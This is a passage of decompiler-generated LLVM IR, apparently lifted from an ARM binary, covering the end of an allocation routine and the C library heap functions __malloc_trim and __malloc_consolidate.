  %v3_117b4 = load i32, i32* %v2_117b4, align 4
  store i32 %v3_117b4, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_117a8, %v3_117a0
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_11790
  store i32 %v2_117a8, i32* %v2_117a0, align 4
  %v0_117bc.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_117bc.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_11790, %bb33
  %v1_117bc = phi i32 [ %v0_1179c, %dec_label_pc_11790 ], [ %v1_117bc.pre, %bb33 ]
  %v0_117bc = phi i32 [ %v2_117a8, %dec_label_pc_11790 ], [ %v0_117bc.pre, %bb33 ]
  %v2_117bc = add i32 %v1_117bc, 868
  %v3_117bc = inttoptr i32 %v2_117bc to i32*
  store i32 %v0_117bc, i32* %v3_117bc, align 4
  %v0_117c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_117c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_117c0 = add i32 %v1_117c0, %v0_117c0
  store i32 %v2_117c0, i32* %r1.global-to-local, align 4
  %v1_117c4 = load i32, i32* %r2.global-to-local, align 4
  %v0_117c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_117c8 = add i32 %v0_117c8, 8
  store i32 %v1_117c8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_117c0, %v1_117c4
  br i1 %tmp43, label %bb35, label %dec_label_pc_1180c

bb35:                                             ; preds = %bb34
  %v5_117cc = load i32, i32* @r8, align 4
  %v6_117cc = add i32 %v5_117cc, 884
  %v7_117cc = inttoptr i32 %v6_117cc to i32*
  store i32 %v2_117c0, i32* %v7_117cc, align 4
  br label %dec_label_pc_1180c

dec_label_pc_117d4:                               ; preds = %dec_label_pc_11774
  %v0_117d4 = load i32, i32* @sb, align 4
  %v1_117d4 = add i32 %v0_117d4, 4
  store i32 %v1_117d4, i32* %r3.global-to-local, align 4
  %v0_117d8 = load i32, i32* @r6, align 4
  %v3_117d8 = icmp ult i32 %v0_117d8, %v1_117d4
  br i1 %v3_117d8, label %dec_label_pc_117e8, label %dec_label_pc_117d4.dec_label_pc_117e0_crit_edge

dec_label_pc_117d4.dec_label_pc_117e0_crit_edge:  ; preds = %dec_label_pc_117d4
  %v0_117e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_117e0

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117d4.dec_label_pc_117e0_crit_edge, %dec_label_pc_11740
  %v0_117e0 = phi i32 [ %v0_117e0.pre, %dec_label_pc_117d4.dec_label_pc_117e0_crit_edge ], [ %v0_11548, %dec_label_pc_11740 ]
  store i32 %v0_117e0, i32* @r4, align 4
  br label %dec_label_pc_1180c

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117d4
  %v1_117e8 = add i32 %v0_117d4, -7
  store i32 %v1_117e8, i32* @r0, align 4
  %v0_117ec = call i32 @malloc()
  store i32 %v0_117ec, i32* @r0, align 4
  store i32 %v0_117ec, i32* @r4, align 4
  %v2_117f0 = icmp eq i32 %v0_117ec, 0
  br i1 %v2_117f0, label %dec_label_pc_1180c, label %dec_label_pc_117f8

dec_label_pc_117f8:                               ; preds = %dec_label_pc_117e8
  %v0_117f8 = load i32, i32* @r6, align 4
  %v1_117f8 = add i32 %v0_117f8, -8
  store i32 %v1_117f8, i32* @r2, align 4
  %v0_117fc = load i32, i32* @r5, align 4
  store i32 %v0_117fc, i32* @r1, align 4
  %v0_11800 = call i32 @memcpy()
  %v0_11804 = load i32, i32* @r5, align 4
  store i32 %v0_11804, i32* @r0, align 4
  %v0_11808 = call i32 @free()
  store i32 %v0_11808, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1180c

dec_label_pc_1180c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_117e8, %dec_label_pc_117e0, %dec_label_pc_11738, %.thread6, %dec_label_pc_115a8, %dec_label_pc_117f8
  store i32 %v2_114f4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  %v4_1181c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1181c)
  br label %dec_label_pc_11828

dec_label_pc_11828:                               ; preds = %dec_label_pc_11528, %dec_label_pc_114d0, %dec_label_pc_114b8, %dec_label_pc_1180c
  %v0_11828 = load i32, i32* @r4, align 4
  store i32 %v0_11828, i32* %r0.global-to-local, align 4
  store i32 %v3_11498, i32* @r4, align 4
  store i32 %v6_11498, i32* @r5, align 4
  store i32 %v9_11498, i32* @r6, align 4
  store i32 %v12_11498, i32* @r7, align 4
  store i32 %v15_11498, i32* @r8, align 4
  store i32 %v18_11498, i32* @sb, align 4
  store i32 %v21_11498, i32* @sl, align 4
  store i32 %v24_11498, i32* @fp, align 4
  store i32 %v27_11498, i32* @lr, align 4
  ret i32 %v0_11828

; uselistorder directives
  uselistorder i32 %v2_117c0, { 1, 0, 2 }
  uselistorder i32 %v2_117a8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11784, { 1, 0, 2 }
  uselistorder i32 %v3_11764, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11708, { 2, 1, 0 }
  uselistorder i32 %v2_116d8, { 1, 0, 2 }
  uselistorder i32 %v0_1166c, { 1, 0 }
  uselistorder i32 %v0_11628, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1158c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11584, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_11568, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_11560, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1155c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1154c, { 1, 0 }
  uselistorder i32 %v0_11548, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_11520, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_11828, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1180c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_11738, { 1, 0 }
  uselistorder label %dec_label_pc_116d8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11624, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11618, { 1, 0 }
  uselistorder label %dec_label_pc_11614, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1183c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1183c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1183c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1183c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_1183c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_11850.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11850.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_11854.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_1183c, %bb
  %v4_11854 = phi i32 [ %v4_11854.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_1183c ], [ 0, %bb ]
  ret i32 %v4_11854

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_11858 = add i32 %arg2, 44
  %v2_11858 = inttoptr i32 %v1_11858 to i32*
  %v3_11858 = load i32, i32* %v2_11858, align 4
  %v12_1185c = load i32, i32* @r7, align 4
  %v1_11860 = add i32 %v3_11858, 4
  %v2_11860 = inttoptr i32 %v1_11860 to i32*
  %v3_11860 = load i32, i32* %v2_11860, align 4
  %v1_11864 = add i32 %arg2, 860
  %v2_11864 = inttoptr i32 %v1_11864 to i32*
  %v3_11864 = load i32, i32* %v2_11864, align 4
  store i32 %v3_11864, i32* @r4, align 4
  %v1_11868 = and i32 %v3_11860, -4
  store i32 %v1_11868, i32* @r6, align 4
  %v1_1186c = add i32 %v1_11868, -17
  %v2_11870 = add i32 %v1_1186c, %v3_11864
  store i32 %arg2, i32* @r5, align 4
  %v2_1187c = sub i32 %v2_11870, %arg1
  store i32 %v3_11864, i32* %r1.global-to-local, align 4
  %v2_11884 = udiv i32 %v2_1187c, %v3_11864
  %v1_11888 = add i32 %v2_11884, -1
  store i32 %v1_11888, i32* %r0.global-to-local, align 4
  %v2_1188c = mul i32 %v1_11888, %v3_11864
  store i32 %v2_1188c, i32* @r7, align 4
  %v2_11890 = icmp eq i32 %v2_1188c, 0
  store i1 %v2_11890, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1188c, 1
  br i1 %tmp8, label %dec_label_pc_118f8, label %dec_label_pc_11898

dec_label_pc_11898:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1189c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1189c, i32* %r0.global-to-local, align 4
  %v0_118a0 = load i32, i32* @r5, align 4
  %v1_118a0 = add i32 %v0_118a0, 44
  %v2_118a0 = inttoptr i32 %v1_118a0 to i32*
  %v3_118a0 = load i32, i32* %v2_118a0, align 4
  %v0_118a4 = load i32, i32* @r6, align 4
  %v2_118a4 = add i32 %v0_118a4, %v3_118a0
  %v9_118a8 = icmp eq i32 %v1_1189c, %v2_118a4
  store i1 %v9_118a8, i1* @cpsr_z, align 1
  store i32 %v1_1189c, i32* @r4, align 4
  br i1 %v9_118a8, label %dec_label_pc_118b4, label %dec_label_pc_118f8

dec_label_pc_118b4:                               ; preds = %dec_label_pc_11898
  %v0_118b4 = load i32, i32* @r7, align 4
  %v1_118b4 = sub i32 0, %v0_118b4
  store i32 %v1_118b4, i32* %r0.global-to-local, align 4
  %v1_118b8 = call i32 @__GI_sbrk(i32 %v1_118b4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_118c0 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_118c0, i32* %r0.global-to-local, align 4
  %v7_118c4 = icmp eq i32 %v1_118c0, -1
  store i1 %v7_118c4, i1* @cpsr_z, align 1
  br i1 %v7_118c4, label %dec_label_pc_118f8, label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118b4
  %v0_118cc = load i32, i32* @r4, align 4
  %v2_118cc = sub i32 %v0_118cc, %v1_118c0
  store i32 %v2_118cc, i32* %r0.global-to-local, align 4
  %v9_118cc = icmp eq i32 %v0_118cc, %v1_118c0
  store i1 %v9_118cc, i1* @cpsr_z, align 1
  br i1 %v9_118cc, label %dec_label_pc_118f8, label %dec_label_pc_118d4

dec_label_pc_118d4:                               ; preds = %dec_label_pc_118cc
  %v0_118d4 = load i32, i32* @r5, align 4
  %v1_118d4 = add i32 %v0_118d4, 872
  %v2_118d4 = inttoptr i32 %v1_118d4 to i32*
  %v3_118d4 = load i32, i32* %v2_118d4, align 4
  %v1_118d8 = load i32, i32* @r6, align 4
  %v2_118d8 = sub i32 %v1_118d8, %v2_118cc
  store i32 %v2_118d8, i32* %r2.global-to-local, align 4
  %v1_118dc = add i32 %v0_118d4, 44
  %v2_118dc = inttoptr i32 %v1_118dc to i32*
  %v3_118dc = load i32, i32* %v2_118dc, align 4
  store i32 %v3_118dc, i32* %r1.global-to-local, align 4
  %v2_118e0 = sub i32 %v3_118d4, %v2_118cc
  %v1_118e4 = or i32 %v2_118d8, 1
  store i32 %v1_118e4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_118e0, i32* %v2_118d4, align 4
  %v0_118f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_118f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_118f0 = add i32 %v1_118f0, 4
  %v3_118f0 = inttoptr i32 %v2_118f0 to i32*
  store i32 %v0_118f0, i32* %v3_118f0, align 4
  %v1_11904.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118fc

dec_label_pc_118f8:                               ; preds = %dec_label_pc_11898, %dec_label_pc_118cc, %dec_label_pc_118b4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %dec_label_pc_118d4, %dec_label_pc_118f8
  %v1_11904 = phi i32 [ %v1_11904.pre, %dec_label_pc_118d4 ], [ 0, %dec_label_pc_118f8 ]
  store i32 %v12_1185c, i32* @r7, align 4
  ret i32 %v1_11904

; uselistorder directives
  uselistorder i1 %v7_118c4, { 1, 0 }
  uselistorder i32 %v1_118c0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11864, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_118fc, { 1, 0 }
  uselistorder label %dec_label_pc_118f8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11908 = load i32, i32* @r4, align 4
  store i32 %v3_11908, i32* %stack_var_-36, align 4
  %v0_1190c = load i32, i32* @r0, align 4
  %v1_1190c = inttoptr i32 %v0_1190c to i32*
  %v2_1190c = load i32, i32* %v1_1190c, align 4
  store i32 %v2_1190c, i32* %r3.global-to-local, align 4
  %v2_11910 = icmp eq i32 %v2_1190c, 0
  store i32 %v0_1190c, i32* @r4, align 4
  br i1 %v2_11910, label %dec_label_pc_11a48.preheader, label %dec_label_pc_11924

dec_label_pc_11a48.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_11a5025 = add i32 %v0_1190c, 52
  store i32 %v1_11a5025, i32* %r3.global-to-local, align 4
  %v2_11a5826 = add i32 %v0_1190c, 60
  %v3_11a5827 = inttoptr i32 %v2_11a5826 to i32*
  store i32 %v1_11a5025, i32* %v3_11a5827, align 4
  %v0_11a5c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_11a5c29 = add i32 %v0_11a5c28, 12
  %v3_11a5c30 = inttoptr i32 %v2_11a5c29 to i32*
  store i32 %v0_11a5c28, i32* %v3_11a5c30, align 4
  br label %dec_label_pc_11a48.dec_label_pc_11a48_crit_edge

dec_label_pc_11924:                               ; preds = %entry
  %v1_11924 = and i32 %v2_1190c, -3
  %v3_11928 = udiv i32 %v2_1190c, 8
  store i32 %v3_11928, i32* %r2.global-to-local, align 4
  store i32 %v1_11924, i32* %v1_1190c, align 4
  %v0_11930 = load i32, i32* @r0, align 4
  %v1_11930 = add i32 %v0_11930, -4
  store i32 %v1_11930, i32* %r3.global-to-local, align 4
  %v1_11934 = load i32, i32* %r2.global-to-local, align 4
  %v4_11934 = mul i32 %v1_11934, 4
  %v5_11934 = add i32 %v4_11934, %v1_11930
  store i32 %v5_11934, i32* %sb.global-to-local, align 4
  %v1_11938 = add i32 %v0_11930, 52
  store i32 %v1_11938, i32* %r7.global-to-local, align 4
  %v1_1193c = add i32 %v0_11930, 4
  store i32 %v1_1193c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_11a40, %dec_label_pc_11924
  %v1_11a3810 = phi i32 [ %v1_11a38, %dec_label_pc_11a40 ], [ %v5_11934, %dec_label_pc_11924 ]
  %v1_11950 = phi i32 [ %v1_11a40, %dec_label_pc_11a40 ], [ %v1_1193c, %dec_label_pc_11924 ]
  %v1_11944 = inttoptr i32 %v1_11950 to i32*
  %v2_11944 = load i32, i32* %v1_11944, align 4
  store i32 %v2_11944, i32* %r1.global-to-local, align 4
  %v2_11948 = icmp eq i32 %v2_11944, 0
  br i1 %v2_11948, label %dec_label_pc_11a38, label %dec_label_pc_11950

dec_label_pc_11950:                               ; preds = %dec_label_pc_11944
  %v0_11950 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_11950, i32* %v1_11944, align 4
  %v0_11954.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11954

dec_label_pc_11954:                               ; preds = %dec_label_pc_11a2c, %dec_label_pc_11950
  %v0_11970 = phi i32 [ %v0_11a2c, %dec_label_pc_11a2c ], [ %v0_11954.pre, %dec_label_pc_11950 ]
  %v1_11954 = add i32 %v0_11970, 4
  %v2_11954 = inttoptr i32 %v1_11954 to i32*
  %v3_11954 = load i32, i32* %v2_11954, align 4
  store i32 %v3_11954, i32* %r3.global-to-local, align 4
  %v1_11958 = and i32 %v3_11954, -2
  store i32 %v1_11958, i32* %lr.global-to-local, align 4
  %v2_1195c = add i32 %v1_11958, %v0_11970
  store i32 %v2_1195c, i32* @r0, align 4
  %v1_11960 = urem i32 %v3_11954, 2
  %v2_11960 = icmp eq i32 %v1_11960, 0
  %v1_11964 = add i32 %v0_11970, 8
  %v2_11964 = inttoptr i32 %v1_11964 to i32*
  %v3_11964 = load i32, i32* %v2_11964, align 4
  store i32 %v3_11964, i32* %sl.global-to-local, align 4
  %v1_11968 = add i32 %v2_1195c, 4
  %v2_11968 = inttoptr i32 %v1_11968 to i32*
  %v3_11968 = load i32, i32* %v2_11968, align 4
  store i32 %v3_11968, i32* %r8.global-to-local, align 4
  br i1 %v2_11960, label %dec_label_pc_11970, label %dec_label_pc_119a4

dec_label_pc_11970:                               ; preds = %dec_label_pc_11954
  %v1_11970 = inttoptr i32 %v0_11970 to i32*
  %v2_11970 = load i32, i32* %v1_11970, align 4
  store i32 %v2_11970, i32* %r5.global-to-local, align 4
  %v2_11974 = sub i32 %v0_11970, %v2_11970
  store i32 %v2_11974, i32* %r3.global-to-local, align 4
  %v1_11978 = add i32 %v2_11974, 8
  %v2_11978 = inttoptr i32 %v1_11978 to i32*
  %v3_11978 = load i32, i32* %v2_11978, align 4
  store i32 %v3_11978, i32* %ip.global-to-local, align 4
  %v1_1197c = add i32 %v3_11978, 12
  %v2_1197c = inttoptr i32 %v1_1197c to i32*
  %v3_1197c = load i32, i32* %v2_1197c, align 4
  store i32 %v3_1197c, i32* %r1.global-to-local, align 4
  %v9_11980 = icmp eq i32 %v3_1197c, %v2_11974
  %v1_11984 = add i32 %v2_11974, 12
  %v2_11984 = inttoptr i32 %v1_11984 to i32*
  %v3_11984 = load i32, i32* %v2_11984, align 4
  store i32 %v3_11984, i32* %r2.global-to-local, align 4
  br i1 %v9_11980, label %dec_label_pc_1198c, label %dec_label_pc_119e8

dec_label_pc_1198c:                               ; preds = %dec_label_pc_11970
  %v1_1198c = add i32 %v3_11984, 8
  %v2_1198c = inttoptr i32 %v1_1198c to i32*
  %v3_1198c = load i32, i32* %v2_1198c, align 4
  store i32 %v3_1198c, i32* %r3.global-to-local, align 4
  %v9_11990 = icmp eq i32 %v3_1198c, %v2_11974
  br i1 %v9_11990, label %dec_label_pc_11998, label %dec_label_pc_119e8

dec_label_pc_11998:                               ; preds = %dec_label_pc_1198c
  store i32 %v3_11978, i32* %v2_1198c, align 4
  %v0_1199c = load i32, i32* %r2.global-to-local, align 4
  %v1_1199c = load i32, i32* %ip.global-to-local, align 4
  %v2_1199c = add i32 %v1_1199c, 12
  %v3_1199c = inttoptr i32 %v2_1199c to i32*
  store i32 %v0_1199c, i32* %v3_1199c, align 4
  %v0_119a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_119a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_119a0 = add i32 %v1_119a0, %v0_119a0
  store i32 %v2_119a0, i32* %lr.global-to-local, align 4
  %v0_119a8.pre = load i32, i32* @r0, align 4
  %v0_119ac.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_11954, %dec_label_pc_11998
  %v0_11a1c = phi i32 [ %v1_11958, %dec_label_pc_11954 ], [ %v2_119a0, %dec_label_pc_11998 ]
  %v0_119ac = phi i32 [ %v3_11968, %dec_label_pc_11954 ], [ %v0_119ac.pre, %dec_label_pc_11998 ]
  %v1_119c0 = phi i32 [ %v2_1195c, %dec_label_pc_11954 ], [ %v0_119a8.pre, %dec_label_pc_11998 ]
  %v0_119a4 = load i32, i32* @r4, align 4
  %v1_119a4 = add i32 %v0_119a4, 44
  %v2_119a4 = inttoptr i32 %v1_119a4 to i32*
  %v3_119a4 = load i32, i32* %v2_119a4, align 4
  store i32 %v3_119a4, i32* %r3.global-to-local, align 4
  %v9_119a8 = icmp eq i32 %v1_119c0, %v3_119a4
  %v1_119ac = and i32 %v0_119ac, -4
  store i32 %v1_119ac, i32* %r5.global-to-local, align 4
  br i1 %v9_119a8, label %dec_label_pc_11a1c, label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %dec_label_pc_119a4
  %v2_119b4 = add i32 %v1_119c0, %v1_119ac
  store i32 %v2_119b4, i32* %r3.global-to-local, align 4
  %v1_119b8 = add i32 %v2_119b4, 4
  %v2_119b8 = inttoptr i32 %v1_119b8 to i32*
  %v3_119b8 = load i32, i32* %v2_119b8, align 4
  store i32 %v3_119b8, i32* %r3.global-to-local, align 4
  %v1_119bc = urem i32 %v3_119b8, 2
  %v2_119bc = icmp eq i32 %v1_119bc, 0
  %v2_119c0 = add i32 %v1_119c0, 4
  %v3_119c0 = inttoptr i32 %v2_119c0 to i32*
  store i32 %v1_119ac, i32* %v3_119c0, align 4
  br i1 %v2_119bc, label %dec_label_pc_119c8, label %dec_label_pc_119b4.dec_label_pc_119f8_crit_edge

dec_label_pc_119b4.dec_label_pc_119f8_crit_edge:  ; preds = %dec_label_pc_119b4
  %v0_119fc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_119f8

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119b4
  %v0_119c8 = load i32, i32* @r0, align 4
  %v1_119c8 = add i32 %v0_119c8, 8
  %v2_119c8 = inttoptr i32 %v1_119c8 to i32*
  %v3_119c8 = load i32, i32* %v2_119c8, align 4
  store i32 %v3_119c8, i32* %ip.global-to-local, align 4
  %v1_119cc = add i32 %v3_119c8, 12
  %v2_119cc = inttoptr i32 %v1_119cc to i32*
  %v3_119cc = load i32, i32* %v2_119cc, align 4
  store i32 %v3_119cc, i32* %r3.global-to-local, align 4
  %v9_119d0 = icmp eq i32 %v3_119cc, %v0_119c8
  %v1_119d4 = add i32 %v0_119c8, 12
  %v2_119d4 = inttoptr i32 %v1_119d4 to i32*
  %v3_119d4 = load i32, i32* %v2_119d4, align 4
  store i32 %v3_119d4, i32* %r2.global-to-local, align 4
  br i1 %v9_119d0, label %dec_label_pc_119dc, label %dec_label_pc_119e8

dec_label_pc_119dc:                               ; preds = %dec_label_pc_119c8
  %v1_119dc = add i32 %v3_119d4, 8
  %v2_119dc = inttoptr i32 %v1_119dc to i32*
  %v3_119dc = load i32, i32* %v2_119dc, align 4
  store i32 %v3_119dc, i32* %r3.global-to-local, align 4
  %v9_119e0 = icmp eq i32 %v3_119dc, %v0_119c8
  br i1 %v9_119e0, label %dec_label_pc_119ec, label %dec_label_pc_119e8

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119c8, %dec_label_pc_1198c, %dec_label_pc_11970, %dec_label_pc_119dc
  %v0_119e8 = call i32 @abort()
  store i32 %v0_119e8, i32* @r0, align 4
  %v0_119ec.pre = load i32, i32* @ip, align 4
  %v1_119ec.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119dc, %dec_label_pc_119e8
  %v1_119ec = phi i32 [ %v3_119d4, %dec_label_pc_119dc ], [ %v1_119ec.pre, %dec_label_pc_119e8 ]
  %v0_119ec = phi i32 [ %v3_119c8, %dec_label_pc_119dc ], [ %v0_119ec.pre, %dec_label_pc_119e8 ]
  %v2_119ec = add i32 %v1_119ec, 8
  %v3_119ec = inttoptr i32 %v2_119ec to i32*
  store i32 %v0_119ec, i32* %v3_119ec, align 4
  %v0_119f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_119f0 = load i32, i32* %ip.global-to-local, align 4
  %v2_119f0 = add i32 %v1_119f0, 12
  %v3_119f0 = inttoptr i32 %v2_119f0 to i32*
  store i32 %v0_119f0, i32* %v3_119f0, align 4
  %v0_119f4 = load i32, i32* %lr.global-to-local, align 4
  %v1_119f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_119f4 = add i32 %v1_119f4, %v0_119f4
  store i32 %v2_119f4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %dec_label_pc_119b4.dec_label_pc_119f8_crit_edge, %dec_label_pc_119ec
  %v0_119fc = phi i32 [ %v0_119fc.pre, %dec_label_pc_119b4.dec_label_pc_119f8_crit_edge ], [ %v2_119f4, %dec_label_pc_119ec ]
  %v0_119f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_119f8 = add i32 %v0_119f8, 8
  %v2_119f8 = inttoptr i32 %v1_119f8 to i32*
  %v3_119f8 = load i32, i32* %v2_119f8, align 4
  store i32 %v3_119f8, i32* %r2.global-to-local, align 4
  %v1_119fc = or i32 %v0_119fc, 1
  store i32 %v1_119fc, i32* %r3.global-to-local, align 4
  %v0_11a00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11a00, i32* %v2_119f8, align 4
  %v0_11a04 = load i32, i32* %r1.global-to-local, align 4
  %v1_11a04 = load i32, i32* %r2.global-to-local, align 4
  %v2_11a04 = add i32 %v1_11a04, 12
  %v3_11a04 = inttoptr i32 %v2_11a04 to i32*
  store i32 %v0_11a04, i32* %v3_11a04, align 4
  %v0_11a08 = load i32, i32* %lr.global-to-local, align 4
  %v1_11a08 = load i32, i32* %r1.global-to-local, align 4
  %v3_11a08 = add i32 %v1_11a08, %v0_11a08
  %v4_11a08 = inttoptr i32 %v3_11a08 to i32*
  store i32 %v0_11a08, i32* %v4_11a08, align 4
  %v0_11a0c = load i32, i32* %r3.global-to-local, align 4
  %v1_11a0c = load i32, i32* %r1.global-to-local, align 4
  %v2_11a0c = add i32 %v1_11a0c, 4
  %v3_11a0c = inttoptr i32 %v2_11a0c to i32*
  store i32 %v0_11a0c, i32* %v3_11a0c, align 4
  %v0_11a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a10 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a10 = add i32 %v1_11a10, 8
  %v3_11a10 = inttoptr i32 %v2_11a10 to i32*
  store i32 %v0_11a10, i32* %v3_11a10, align 4
  %v0_11a14 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a14 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a14 = add i32 %v1_11a14, 12
  %v3_11a14 = inttoptr i32 %v2_11a14 to i32*
  store i32 %v0_11a14, i32* %v3_11a14, align 4
  br label %dec_label_pc_11a2c

dec_label_pc_11a1c:                               ; preds = %dec_label_pc_119a4
  %v2_11a1c = add i32 %v1_119ac, %v0_11a1c
  %v1_11a20 = or i32 %v2_11a1c, 1
  store i32 %v1_11a20, i32* %r3.global-to-local, align 4
  %v1_11a24 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a24 = add i32 %v1_11a24, 4
  %v3_11a24 = inttoptr i32 %v2_11a24 to i32*
  store i32 %v1_11a20, i32* %v3_11a24, align 4
  %v0_11a28 = load i32, i32* %r1.global-to-local, align 4
